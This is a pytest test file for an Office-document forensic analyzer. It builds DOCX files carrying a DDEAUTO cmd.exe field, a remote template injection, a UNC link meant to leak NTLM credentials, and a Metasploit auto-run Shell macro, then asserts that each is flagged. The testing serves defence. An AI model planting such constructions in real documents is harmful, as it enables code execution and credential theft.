"""Documents Office : macros, DDE, relations externes, chiffrement, signatures de fichier."""
from __future__ import annotations

import os
import shutil
import zipfile

import pytest

pytest.importorskip("oletools")

from forensic_analyzer.analyzers.office import OfficeAnalyzer
from forensic_analyzer.utils.magic import get_file_magic_extension

_RELS = 'xmlns="http://schemas.openxmlformats.org/package/2006/relationships"'
_REL_TYPE = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
_BODY = '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>{}</w:body></w:document>'
METASPLOIT_VBA = "/usr/share/metasploit-framework/data/exploits/office_word_macro/vbaProject.bin"


def _docx(path, body: str = "<w:p/>", extra: dict[str, str | bytes] | None = None) -> str:
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types/>')
        z.writestr("_rels/.rels", f"<Relationships {_RELS}/>")
        z.writestr("word/document.xml", _BODY.format(body))
        for name, data in (extra or {}).items():
            z.writestr(name, data)
    return str(path)


def _external(kind: str, target: str) -> dict[str, str]:
    return {"word/_rels/settings.xml.rels":
            f'<Relationships {_RELS}><Relationship Id="r1" Type="{_REL_TYPE}{kind}" '
            f'Target="{target}" TargetMode="External"/></Relationships>'}


def test_file_signatures_route_office_documents(tmp_path):
    assert get_file_magic_extension(_docx(tmp_path / "rapport.zip")) == ".ooxml"      # extension trompeuse
    with zipfile.ZipFile(tmp_path / "a.zip", "w") as z:
        z.writestr("note.txt", "x")
    assert get_file_magic_extension(str(tmp_path / "a.zip")) == ".zip"
    (tmp_path / "x.bin").write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 504)
    assert get_file_magic_extension(str(tmp_path / "x.bin")) == ".ole"
    assert OfficeAnalyzer().can_handle(str(tmp_path / "rapport.zip"))


def test_benign_document_is_info(tmp_path):
    f = OfficeAnalyzer().analyze(_docx(tmp_path / "ok.docx"))
    assert f.severity == "info" and not f.incomplete and "[ALERTE] Verdict" not in f.metadata


def test_remote_template_and_unc_object_are_flagged(tmp_path):
    f = OfficeAnalyzer().analyze(_docx(tmp_path / "t.docx", extra=_external("attachedTemplate", "https://cdn.example.org/t.dotm")))
    assert f.severity == "élevé" and "T1221" in f.metadata["[ALERTE] Verdict"]
    assert f.extra["office_urls"] == ["https://cdn.example.org/t.dotm"]

    f = OfficeAnalyzer().analyze(_docx(tmp_path / "u.docx", extra=_external("oleObject", r"\\203.0.113.42\share\x.png")))
    assert f.severity == "élevé" and "NTLM" in f.metadata["Raisons"]


def test_hyperlinks_are_not_alerts(tmp_path):
    f = OfficeAnalyzer().analyze(_docx(tmp_path / "h.docx", extra=_external("hyperlink", "https://example.org/")))
    assert f.severity == "info"


def test_dde_command_is_critical(tmp_path):
    field = ('<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe '
             '"/k calc"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')
    f = OfficeAnalyzer().analyze(_docx(tmp_path / "dde.docx", field))
    assert f.severity == "critique" and "cmd" in f.metadata["Champs DDE"]


def test_unreadable_document_is_not_called_clean(tmp_path):
    path = tmp_path / "corrompu.doc"
    path.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 600)
    f = OfficeAnalyzer().analyze(str(path))
    assert f.incomplete and "[ATTENTION] Non analysé" in f.metadata


@pytest.mark.skipif(not os.path.isfile(METASPLOIT_VBA), reason="échantillon Metasploit absent")
def test_auto_executed_macro_that_runs_a_shell_is_critical(tmp_path):
    vba = tmp_path / "vbaProject.bin"
    shutil.copy(METASPLOIT_VBA, vba)
    docm = _docx(tmp_path / "facture.docm", extra={"word/vbaProject.bin": vba.read_bytes()})
    for path in (str(vba), docm):
        f = OfficeAnalyzer().analyze(path)
        assert f.severity == "critique" and f.metadata["Auto-exécution"] == "AutoOpen"
        assert "Shell" in f.metadata["Raisons"] and "AutoOpen" in f.metadata["Code des macros"]
